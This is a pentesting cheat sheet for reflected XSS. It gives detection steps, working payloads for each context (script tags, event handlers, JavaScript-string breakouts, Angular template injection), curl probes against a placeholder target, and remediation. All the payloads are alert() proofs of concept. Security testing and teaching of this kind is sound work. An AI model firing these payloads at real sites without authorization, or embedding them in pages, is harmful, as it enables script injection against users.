# Reflected XSS

## Summary
Payload reflected immediately in the HTTP response without proper encoding.

## Detection

### Step 1: Identify Reflection Points
Test all user-controllable inputs reflected in responses:
- URL parameters, path segments
- POST body fields
- Headers (User-Agent, Referer, X-Forwarded-For)
- File names on upload

### Step 2: Probe with Safe Payloads
```html
# Use unique strings to trace reflection
l7d9k2
'"><img src=x onerror=alert(1)>
```

Search the response for your probe string.

### Step 3: Determine Context
| Injection context | Test payload |
|------------------|--------------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute (unquoted) | ` foo=bar` → breaks attribute |
| HTML attribute (quoted) | `" onclick=alert(1)` |
| JavaScript string | `';alert(1)//` |
| JavaScript template literal | `${alert(1)}` |
| CSS | `</style><script>alert(1)</script>` |
| JSON response | Check if Content-Type allows execution |

## Payloads by Context

### HTML Element
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details/open/ontoggle=alert(1)>
```

### HTML Attribute
```html
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) "
' onfocus=alert(1) '
```

### JavaScript
```js
';alert(1)//
';alert(1);'
${alert(1)}
</script><script>alert(1)</script>
```

### Angular/React Context (SPA)
```html
{{constructor.constructor('alert(1)')()}}
{*$eval*}{constructor.constructor('alert(1)')()}
```

### JSON API (non-HTTPOnly)
If API returns your payload in JSON but Content-Type is `application/json`:
- Only exploitable if the client renders it unsafely (innerHTML)
- Still worth reporting as XSS in context

## API-Specific Testing
```bash
# Search endpoint (REST)
curl "https://target.com/rest/products/search?q=<script>alert(1)</script>"
# Check response body for unescaped payload

# Check Content-Type
curl -sI "https://target.com/rest/products/search?q=test" | grep content-type
```

## Remediation
- Context-appropriate output encoding
- Content Security Policy headers
- Never render user input without sanitization
